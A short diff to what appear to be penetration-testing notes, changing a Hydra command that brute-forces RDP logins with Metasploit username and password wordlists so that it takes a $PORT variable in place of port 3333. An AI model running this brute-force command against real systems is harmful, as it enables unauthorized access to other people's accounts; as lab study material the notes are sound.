@@ -13,7 +13,7 @@ run
 
 brute force login using Hydra
 ```bash
-hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt  -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -s 3333 $IP rdp
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt  -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -s $PORT $IP rdp
 ```
 
 xfreerdp to login
